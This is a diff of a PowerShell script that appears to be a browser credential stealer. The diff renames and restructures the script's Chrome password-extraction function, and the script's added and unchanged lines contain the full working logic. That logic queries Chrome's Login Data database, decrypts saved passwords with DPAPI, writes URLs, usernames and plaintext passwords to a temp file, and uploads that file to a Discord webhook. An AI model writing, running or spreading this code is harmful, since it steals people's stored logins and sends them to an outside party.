@@ -18,57 +18,7 @@ function Send-DiscordMessage {
     }
 }
 
-# Function to extract and decode passwords from Chrome Login Data
-function Extract-DecodedPasswords {
-    param (
-        [string]$chromeLoginDataPath,
-        [string]$outputFilePath
-    )
-
-    # Check if the Login Data file exists
-    if (-not (Test-Path $chromeLoginDataPath)) {
-        Write-Host "Login Data file not found: $chromeLoginDataPath"
-        return
-    }
-
-    try {
-        # Open SQLite connection to the Chrome login data
-        $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$chromeLoginDataPath;Version=3;"
-        $connection.Open()
-
-        # SQL query to extract usernames and passwords from the logins table
-        $command = $connection.CreateCommand()
-        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        
-        # Execute the command and read the results
-        $reader = $command.ExecuteReader()
-
-        $output = ""
-
-        while ($reader.Read()) {
-            $origin_url = $reader["origin_url"]
-            $username_value = $reader["username_value"]
-            $password_value = $reader["password_value"]
-
-            # Decrypt the password using DPAPI (Windows method)
-            $password = Decrypt-ChromePassword -encryptedPassword $password_value
-
-            # Write the decoded data to output string
-            $output += "Origin: $origin_url`nUsername: $username_value`nPassword: $password`n`n"
-        }
-
-        # Save the decoded passwords to a text file
-        $output | Out-File -FilePath $outputFilePath
-        Write-Host "Decoded passwords saved to: $outputFilePath"
-
-        # Close the connection
-        $connection.Close()
-    } catch {
-        Write-Host "Error extracting and decoding passwords: $_"
-    }
-}
-
-# Function to decrypt Chrome passwords using DPAPI
+# Function to decrypt Chrome password using DPAPI
 function Decrypt-ChromePassword {
     param (
         [byte[]]$encryptedPassword
@@ -80,7 +30,7 @@ function Decrypt-ChromePassword {
     using System.Runtime.InteropServices;
     using System.Security.Cryptography;
     using System.Text;
-    
+
     public class DPAPI {
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
         public static extern IntPtr LocalAlloc(int uFlags, uint sizetdwBytes);
@@ -131,6 +81,58 @@ function Decrypt-ChromePassword {
     return [DPAPI]::Decrypt($encryptedPassword)
 }
 
+# Function to extract passwords from Chrome's Login Data
+function Extract-ChromePasswords {
+    param (
+        [string]$chromeLoginDataPath,
+        [string]$outputFilePath
+    )
+
+    # Check if the Login Data file exists
+    if (-not (Test-Path $chromeLoginDataPath)) {
+        Write-Host "Login Data file not found: $chromeLoginDataPath"
+        return
+    }
+
+    try {
+        # Open the Login Data file (SQLite database)
+        $connectionString = "Data Source=$chromeLoginDataPath;Version=3;"
+        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+        $connection.Open()
+
+        # Query to get the login data
+        $command = $connection.CreateCommand()
+        $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+        $reader = $command.ExecuteReader()
+
+        # Prepare output string
+        $output = ""
+
+        while ($reader.Read()) {
+            $origin_url = $reader["origin_url"]
+            $username = $reader["username_value"]
+            $encryptedPassword = $reader["password_value"]
+
+            # Decrypt the password
+            $password = Decrypt-ChromePassword -encryptedPassword $encryptedPassword
+
+            # Append to the output string
+            $output += "Origin: $origin_url`nUsername: $username`nPassword: $password`n`n"
+        }
+
+        # Save the result to a text file
+        $output | Out-File -FilePath $outputFilePath
+
+        # Close the database connection
+        $connection.Close()
+
+        Write-Host "Decoded passwords saved to: $outputFilePath"
+
+    } catch {
+        Write-Host "Error extracting passwords: $_"
+    }
+}
+
 # Function for uploading files to Discord via webhook
 function Upload-FileToDiscord {
     param (
@@ -177,7 +179,7 @@ if (-not (Test-Path $loginDataPath)) {
 $outputFile = "$env:TEMP\chrome_passwords.txt"
 
 # Extract and decode passwords
-Extract-DecodedPasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile
+Extract-ChromePasswords -chromeLoginDataPath $loginDataPath -outputFilePath $outputFile
 
 # Upload the .txt file containing decoded passwords to Discord
 Upload-FileToDiscord -filePath $outputFile
